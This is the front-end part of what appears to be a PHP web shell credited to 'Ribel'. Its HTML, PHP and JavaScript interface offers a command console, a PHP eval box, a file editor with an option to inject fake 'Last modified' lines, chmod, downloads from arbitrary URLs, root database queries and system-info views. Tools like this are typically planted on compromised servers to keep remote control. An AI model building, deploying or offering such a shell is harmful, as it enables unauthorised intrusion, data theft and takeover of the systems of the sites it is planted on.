              <a class="ico ico-del" href="?d=<?= urlencode($CWD) ?>&del=<?= urlencode($fp) ?>&token=<?= $TOKEN ?>" title="Delete" onclick="return confirm('Delete <?= $esc ?>?')"><?= svg_trash() ?></a>
<?php endif; ?>
            </td>
          </tr>
<?php endforeach; ?>
<?php if (!$files): ?>
          <tr><td colspan="7" style="text-align:center;color:#666;padding:28px">Directory is empty.</td></tr>
<?php endif; ?>
        </tbody>
      </table>
    </form>
  </div>

  <div class="stats">
    <span><?= (int)$dirCount ?> folder(s), <?= (int)$fileCount ?> file(s)</span>
    <span><?= htmlspecialchars($CWD) ?></span>
    <span>PHP <?= phpversion() ?> · <?= round(memory_get_usage(true)/1048576,1) ?> MB</span>
  </div>
</div>

<div class="footer">Create By <a href="#">Ribel</a></div>

</div><!-- /.wrap -->

<!-- MODALS -->
<div class="modal-bg" id="modal-cmd">
  <div class="modal wide">
    <div class="mhd"><h2>Console</h2><button type="button" class="x" onclick="closeModal('cmd')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Command</label>
        <input type="text" name="cmd" placeholder="ls -la" autofocus>
        <div class="hint">Working dir: <?= htmlspecialchars($CWD) ?></div>
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Run</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('cmd')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-eval">
  <div class="modal wide">
    <div class="mhd"><h2>PHP Eval</h2><button type="button" class="x" onclick="closeModal('eval')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">PHP Code (no open tags)</label>
        <textarea name="eval_code" style="height:240px" placeholder="echo phpinfo();"></textarea>
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Execute</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('eval')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-mkdir">
  <div class="modal">
    <div class="mhd"><h2>New Folder</h2><button type="button" class="x" onclick="closeModal('mkdir')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Folder name</label>
        <input type="text" name="new_dir" placeholder="new-folder">
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Create</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('mkdir')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-edit">
  <div class="modal wide">
    <div class="mhd"><h2>New / Edit File</h2><button type="button" class="x" onclick="closeModal('edit')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Load existing</label>
        <select id="edit-file-select" onchange="loadFileToEdit(this.value)">
          <option value="">-- New file --</option>
<?php foreach ($files as $f): if (!$f['isdir']): ?>
          <option value="<?= htmlspecialchars($f['name']) ?>"><?= htmlspecialchars($f['name']) ?></option>
<?php endif; endforeach; ?>
        </select>
        <div id="edit-file-info" class="hint" style="display:none"></div>
        <label class="lbl">Filename</label>
        <input type="text" name="file_name" id="edit-file-name" placeholder="filename.php" value="<?= htmlspecialchars($editFileName) ?>">
        <label class="lbl">Content</label>
        <textarea name="file_content" id="edit-textarea" style="height:340px"><?= $editContent ?></textarea>
        <label class="chkline"><input type="checkbox" name="inject_timestamp" value="1" id="inject-ts"> Auto-inject // Last modified (PHP)</label>
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Save</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('edit')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-chmod">
  <div class="modal">
    <div class="mhd"><h2>Chmod</h2><button type="button" class="x" onclick="closeModal('chmod')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Path</label>
        <input type="text" name="chmod_path" id="chmod-path" placeholder="file or dir">
        <label class="lbl">Mode</label>
        <input type="text" name="chmod_mode" value="0644" placeholder="0755">
        <label class="chkline"><input type="checkbox" name="chmod_recursive" value="1"> Recursive</label>
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Apply</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('chmod')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-wget">
  <div class="modal">
    <div class="mhd"><h2>Wget / Download URL</h2><button type="button" class="x" onclick="closeModal('wget')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">URL</label>
        <input type="text" name="wget_url" placeholder="https://...">
        <label class="lbl">Save as (optional)</label>
        <input type="text" name="wget_name" placeholder="filename.bin">
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Download</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('wget')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-db">
  <div class="modal wide">
    <div class="mhd"><h2>Database Query</h2><button type="button" class="x" onclick="closeModal('db')">×</button></div>
    <div class="mbd">
      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <div class="grid2">
          <div><label class="lbl">Host</label><input type="text" name="db_host" value="localhost"></div>
          <div><label class="lbl">Port</label><input type="number" name="db_port" value="3306"></div>
          <div><label class="lbl">User</label><input type="text" name="db_user" value="root"></div>
          <div><label class="lbl">Password</label><input type="password" name="db_pass"></div>
        </div>
        <label class="lbl">Database</label>
        <input type="text" name="db_name" placeholder="db name">
        <label class="lbl">SQL</label>
        <textarea name="db_query" style="height:120px" placeholder="SHOW TABLES;"></textarea>
        <div class="row-btns">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Run Query</button>
          <button type="button" class="btn btn-dark" onclick="closeModal('db')">Cancel</button>
        </div>
      </form>
    </div>
  </div>
</div>

<div class="modal-bg" id="modal-sysinfo">
  <div class="modal wide">
    <div class="mhd"><h2>System Info</h2><button type="button" class="x" onclick="closeModal('sysinfo')">×</button></div>
    <div class="mbd">
      <table class="sys-table">
<?php foreach ($sysInfo as $k => $v): ?>
        <tr><td><?= htmlspecialchars($k) ?></td><td><?= htmlspecialchars((string)$v) ?></td></tr>
<?php endforeach; ?>
      </table>
    </div>
    <div class="mft"><button type="button" class="btn btn-dark" onclick="closeModal('sysinfo')">Close</button></div>
  </div>
</div>

<div class="modal-bg" id="modal-tools">
  <div class="modal wide">
    <div class="mhd"><h2>Tools</h2><button type="button" class="x" onclick="closeModal('tools')">×</button></div>
    <div class="mbd">
      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <input type="hidden" name="clear_cache" value="1">
        <button type="submit" class="btn btn-dark">Clear PHP Caches</button>
      </form>

      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Create ZIP</label>
        <div style="display:flex;gap:6px;margin-bottom:6px">
          <input type="text" name="zip_name" placeholder="backup.zip" style="flex:1;margin:0">
          <button type="submit" class="btn btn-green" style="width:auto;margin:0">Create</button>
        </div>
        <div style="max-height:140px;overflow:auto;border:1px solid #2a2a2a;background:#0f0f0f;padding:6px">
<?php foreach ($files as $f): ?>
          <label class="chkline"><input type="checkbox" name="zip_items[]" value="<?= htmlspecialchars($f['name']) ?>">
            <?= $f['isdir'] ? '[DIR] ' : '' ?><?= htmlspecialchars($f['name']) ?>
          </label>
<?php endforeach; ?>
        </div>
      </form>

      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Copy</label>
        <div class="grid2">
          <input type="text" name="copy_source" placeholder="source">
          <input type="text" name="copy_dest" placeholder="dest">
        </div>
        <button type="submit" class="btn btn-dark" style="margin-top:4px">Copy</button>
      </form>

      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Extract archive</label>
        <div style="display:flex;gap:6px">
          <input type="text" name="extract_file" placeholder="archive.zip" style="flex:1;margin:0">
          <button type="submit" class="btn btn-dark" style="margin:0">Extract</button>
        </div>
      </form>

      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Rename</label>
        <div class="grid2">
          <input type="text" name="rename_from" placeholder="from">
          <input type="text" name="rename_to" placeholder="to">
        </div>
        <button type="submit" class="btn btn-dark" style="margin-top:4px">Rename</button>
      </form>

      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Symlink</label>
        <div class="grid2">
          <input type="text" name="symlink_target" placeholder="target path">
          <input type="text" name="symlink_name" placeholder="link name">
        </div>
        <button type="submit" class="btn btn-dark" style="margin-top:4px">Create Link</button>
      </form>

      <form method="post" style="margin-bottom:14px">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Hash file</label>
        <div style="display:flex;gap:6px">
          <input type="text" name="hash_file" placeholder="filename" style="flex:1;margin:0">
          <select name="hash_algo" style="width:110px;margin:0">
            <option value="sha256">SHA-256</option>
            <option value="md5">MD5</option>
            <option value="sha1">SHA-1</option>
          </select>
          <button type="submit" class="btn btn-dark" style="margin:0">Hash</button>
        </div>
      </form>

      <form method="post">
        <input type="hidden" name="token" value="<?= $TOKEN ?>">
        <label class="lbl">Touch file</label>
        <div style="display:flex;gap:6px">
          <input type="text" name="touch_file" placeholder="filename" style="flex:1;margin:0">
          <button type="submit" class="btn btn-dark" style="margin:0">Touch</button>
        </div>
      </form>
    </div>
    <div class="mft"><button type="button" class="btn btn-dark" onclick="closeModal('tools')">Close</button></div>
  </div>
</div>

<div class="modal-bg" id="modal-view">
  <div class="modal wide">
    <div class="mhd"><h2 id="view-title">View File</h2><button type="button" class="x" onclick="closeModal('view')">×</button></div>
    <div class="mbd"><pre class="out" id="view-content">Loading...</pre></div>
    <div class="mft"><button type="button" class="btn btn-dark" onclick="closeModal('view')">Close</button></div>
  </div>
</div>

<script>
var TOKEN = <?= json_encode($TOKEN) ?>;
var CWD = <?= json_encode($CWD) ?>;

function openModal(name, param) {
  var el = document.getElementById('modal-' + name);
  if (!el) return;
  el.classList.add('show');
  var inp = el.querySelector('input[type=text],input[type=password],textarea');
  if (inp && name !== 'edit' && name !== 'view') setTimeout(function(){ try{inp.focus();}catch(e){} }, 40);
  if (name === 'edit' && param) {
    document.getElementById('edit-file-name').value = param;
    document.getElementById('edit-file-select').value = param;
    loadFileToEdit(param);
  }
  if (name === 'view' && param) {
    document.getElementById('view-title').textContent = 'View: ' + param;
    document.getElementById('view-content').textContent = 'Loading...';
    fetch('?d=' + encodeURIComponent(CWD) + '&view=' + encodeURIComponent(param) + '&token=' + encodeURIComponent(TOKEN), {headers:{'X-Requested-With':'XMLHttpRequest'}})
      .then(function(r){ if(!r.ok) throw new Error('HTTP '+r.status); return r.text(); })
      .then(function(t){ document.getElementById('view-content').textContent = t; })
      .catch(function(e){ document.getElementById('view-content').textContent = 'Error: ' + e.message; });
  }
  if (name === 'chmod' && param) {
    var cp = document.getElementById('chmod-path');
    if (cp) cp.value = param;
  }
}
function closeModal(name) {
  var el = document.getElementById('modal-' + name);
  if (el) el.classList.remove('show');
}
function rowCheck(cb) {
  var tr = cb.closest('tr');
  if (tr) {
    if (cb.checked) tr.classList.add('selected');
    else tr.classList.remove('selected');
  }
  updateCount();
}
function toggleAll(src) {
  var checks = document.querySelectorAll('.file-check');
  for (var i=0;i<checks.length;i++){ checks[i].checked = src.checked; rowCheck(checks[i]); }
  updateCount();
}
function selectAll(){ var c=document.querySelectorAll('.file-check'); for(var i=0;i<c.length;i++){c[i].checked=true;rowCheck(c[i]);} updateCount(); }
function invertSelection(){ var c=document.querySelectorAll('.file-check'); for(var i=0;i<c.length;i++){c[i].checked=!c[i].checked;rowCheck(c[i]);} updateCount(); }
function clearSelection(){
  var c=document.querySelectorAll('.file-check'); for(var i=0;i<c.length;i++){c[i].checked=false;rowCheck(c[i]);}
  var h=document.querySelector('thead input[type=checkbox]'); if(h) h.checked=false; updateCount();
}
function updateCount(){
  var n=document.querySelectorAll('.file-check:checked').length;
  var el=document.getElementById('selected-count'); if(el) el.textContent=n+' selected';
}
function filterFiles(){
  var q=(document.getElementById('file-filter').value||'').toLowerCase();
  var rows=document.querySelectorAll('#file-tbody tr');
  for(var i=0;i<rows.length;i++){
    var r=rows[i];
    if(r.classList.contains('parent-row')){ r.style.display=''; continue; }
    var name=r.getAttribute('data-name')||'';
    r.style.display = name.toLowerCase().indexOf(q)!==-1 ? '' : 'none';
  }
}
function sortColumn(col){
  var p=new URLSearchParams(window.location.search);
  var cur=p.get('sort')||'';
  if(col==='name') p.set('sort', cur==='name_asc'?'name_desc':'name_asc');
  else if(col==='size') p.set('sort', cur==='size_asc'?'size_desc':'size_asc');
  else if(col==='mtime') p.set('sort', cur==='mtime_asc'?'mtime_desc':'mtime_asc');
  p.delete('view'); p.delete('load_edit');
  window.location.search=p.toString();
}
function bulkDelete(){
  var n=document.querySelectorAll('.file-check:checked').length;
  if(!n){ alert('No files selected.'); return; }
  if(confirm('Delete '+n+' item(s)?')){ document.getElementById('bulk-action').value='delete'; document.getElementById('bulk-form').submit(); }
}
function bulkZip(){
  var checks=document.querySelectorAll('.file-check:checked');
  if(!checks.length){ alert('No files selected.'); return; }
  var name=prompt('Archive name:','archive_'+new Date().toISOString().slice(0,10)+'.zip');
  if(!name) return;
  var form=document.createElement('form'); form.method='POST';
  var html='<input type="hidden" name="token" value="'+TOKEN+'"><input type="hidden" name="zip_name" value="'+name.replace(/"/g,'&quot;')+'">';
  for(var i=0;i<checks.length;i++) html+='<input type="hidden" name="zip_items[]" value="'+checks[i].value.replace(/"/g,'&quot;')+'">';
  form.innerHTML=html; document.body.appendChild(form); form.submit();
}
function getCheckedValues(){ var c=document.querySelectorAll('.file-check:checked'), v=[]; for(var i=0;i<c.length;i++) v.push(c[i].value); return v; }
function cutSelected(){ var v=getCheckedValues(); if(!v.length){alert('No files selected.');return;} clipboardSubmit('cut',v); }
function copySelected(){ var v=getCheckedValues(); if(!v.length){alert('No files selected.');return;} clipboardSubmit('copy',v); }
function pasteItems(){ clipboardSubmit('paste',[]); }
function clearClipboard(){ clipboardSubmit('clear',[]); }
function clipboardSubmit(action, items){
  var form=document.createElement('form'); form.method='POST';
  var html='<input type="hidden" name="token" value="'+TOKEN+'"><input type="hidden" name="clipboard_action" value="'+action+'">';
  for(var i=0;i<items.length;i++) html+='<input type="hidden" name="clipboard_items[]" value="'+items[i].replace(/"/g,'&quot;')+'">';
  form.innerHTML=html; document.body.appendChild(form); form.submit();
}
function loadFileToEdit(fname){
  if(!fname){
    document.getElementById('edit-file-info').style.display='none';
    document.getElementById('edit-textarea').value='';
    document.getElementById('inject-ts').checked=false;
    return;
  }
  document.getElementById('edit-file-name').value=fname;
  document.getElementById('inject-ts').checked=/\.php$/i.test(fname);
  fetch('?d='+encodeURIComponent(CWD)+'&load_edit='+encodeURIComponent(fname)+'&token='+encodeURIComponent(TOKEN),{headers:{'X-Requested-With':'XMLHttpRequest'}})
    .then(function(r){ if(!r.ok) throw new Error('HTTP '+r.status); return r.text(); })
    .then(function(t){
      document.getElementById('edit-textarea').value=t;
      document.getElementById('edit-file-info').style.display='block';
      document.getElementById('edit-file-info').textContent='Loaded: '+fname;
    })
    .catch(function(e){
      document.getElementById('edit-file-info').style.display='block';
      document.getElementById('edit-file-info').textContent='Failed: '+e.message;
    });
}
document.addEventListener('click', function(e){ if(e.target.classList.contains('modal-bg')) e.target.classList.remove('show'); });
document.addEventListener('keydown', function(e){
  if(e.key==='Escape'){ var ms=document.querySelectorAll('.modal-bg.show'); for(var i=0;i<ms.length;i++) ms[i].classList.remove('show'); }
});
updateCount();
</script>
</body>
</html>
